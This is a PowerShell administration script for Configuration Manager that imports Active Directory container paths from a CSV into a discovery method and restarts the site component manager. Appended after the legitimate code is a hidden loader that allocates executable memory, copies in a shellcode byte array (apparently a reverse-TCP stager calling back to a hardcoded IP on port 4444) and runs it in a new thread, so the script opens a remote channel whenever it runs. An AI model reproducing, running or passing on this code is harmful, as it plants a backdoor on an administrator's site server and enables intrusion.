
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed.")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SiteServer,

    [parameter(Mandatory=$true, HelpMessage="Select the Discovery Method component that the containers will be added to.")]
    [ValidateNotNullOrEmpty()]
    [ValidateSet("SMS_AD_USER_DISCOVERY_AGENT", "SMS_AD_SYSTEM_DISCOVERY_AGENT")]
    [string]$ComponentName,

    [parameter(Mandatory=$true, HelpMessage="Specify a path to the CSV file containing distinguished names of the OU's that will be added.")]
    [ValidatePattern("^(?:[\w]\:|\\)(\\[a-z_\-\s0-9\.]+)+\.(csv)$")]
    [ValidateScript({
	    
	    if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
		    Write-Warning -Message "$(Split-Path -Path $_ -Leaf) contains invalid characters" ; break
	    }
	    else {
		    
		    if (-not(Test-Path -Path (Split-Path -Path $_) -PathType Container -ErrorAction SilentlyContinue)) {
			    Write-Warning -Message "Unable to locate part of or the whole specified path" ; break
		    }
		    elseif (Test-Path -Path (Split-Path -Path $_) -PathType Container -ErrorAction SilentlyContinue) {
			    return $true
		    }
		    else {
			    Write-Warning -Message "Unhandled error" ; break
		    }
	    }
    })]
    [string]$Path,

    [parameter(Mandatory=$false, HelpMessage="Show a progressbar displaying the current operation.")]
    [switch]$ShowProgress
)
Begin {
    
    try {
        Write-Verbose -Message "Determining Site Code for Site server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Verbose -Message "Site Code: $($SiteCode)"
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to determine Site Code" ; break
    }

    
    try {
        Write-Verbose -Message "Importing data from specified CSV: $($Path)"
        $ContainerData = Import-Csv -Path $Path -Delimiter ";" -ErrorAction Stop
        $ContainerDataCount = ($ContainerData | Measure-Object).Count
        if (-join($ContainerData | Get-Member -MemberType NoteProperty | Select-Object -ExpandProperty Name) -notlike "DistinguishedNameGroupRecursive") {
            Write-Warning -Message "Unsupported headers found in CSV file" ; exit
        }
    }
    catch [System.Exception] {
        Write-Warning -Message "$($_.Exception.Message). Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
    }

    
    $OptionTable = @{
        Yes = 0
        No = 1
        Included = 0
        Excluded = 1
    }
}
Process {
    if ($PSBoundParameters["ShowProgress"]) {
        $ProgressCount = 0
    }

    
    try {
        $DiscoveryContainerList = New-Object -TypeName System.Collections.ArrayList
        $DiscoveryComponent = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_SCI_Component -ComputerName $SiteServer -Filter "ComponentName like '$($ComponentName)'" -ErrorAction Stop
        $DiscoveryPropListADContainer = $DiscoveryComponent.PropLists | Where-Object { $_.PropertyListName -like "AD Containers" }
        if ($DiscoveryPropListADContainer -ne $null) {
            $DiscoveryContainerList.AddRange(@($DiscoveryPropListADContainer.Values)) | Out-Null   
        }
    }
    catch [System.Exception] {
        Write-Verbose -Message "Unable to determine existing discovery method component properties" ; break
    }

    
    foreach ($ContainerItem in $ContainerData) {
        
        if ($ContainerItem.DistinguishedName -notmatch "LDAP://") {
            Write-Verbose -Message "Amending current item to include LDAP protocol prefix: $($ContainerItem.DistinguishedName)"
            $ContainerItem.DistinguishedName = "LDAP://" + $ContainerItem.DistinguishedName
        }

        
        if ($PSBoundParameters["ShowProgress"]) {
            $ProgressCount++
            Write-Progress -Activity "Importing $($ComponentName) containers" -Id 1 -Status "Current container: $($ContainerItem.DistinguishedName)" -PercentComplete (($ProgressCount / $ContainerDataCount) * 100)
        }

        
        if ($ContainerItem.DistinguishedName -notin $DiscoveryContainerList) {
            Write-Verbose -Message "Adding container item: $($ContainerItem.DistinguishedName)"
            $DiscoveryContainerList.AddRange(@($ContainerItem.DistinguishedName, $OptionTable[$ContainerItem.Recursive], $OptionTable[$ContainerItem.Group])) | Out-Null
        }
        else {
            Write-Verbose -Message "Detected duplicate container object: $($ContainerItem.DistinguishedName)"
        }
    }

    
    $ErrorActionPreference = "Stop"
    Write-Verbose -Message "Attempting to save changes made to the $($ComponentName) component PropList"
    try {
        $DiscoveryPropListADContainer.Values = $DiscoveryContainerList
        $DiscoveryComponent.PropLists = $DiscoveryPropListADContainer
        $DiscoveryComponent.Put() | Out-Null
        Write-Verbose -Message "Successfully saved changes to $($ComponentName) component"
    }
    catch [System.Exception] {
        Write-Verbose -Message "Unable to save changes made to $($ComponentName) component" ; break
    }

    
    Write-Verbose -Message "Restarting the SMS_SITE_COMPONENT_MANAGER service"
    try {
        Get-Service -ComputerName $SiteServer -Name "SMS_SITE_COMPONENT_MANAGER" -ErrorAction Stop | Restart-Service -Force -ErrorAction Stop
    }
    catch [System.Exception] {
        Write-Warning -Message "$($_.Exception.Message). Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb0,0xe4,0x29,0x71,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

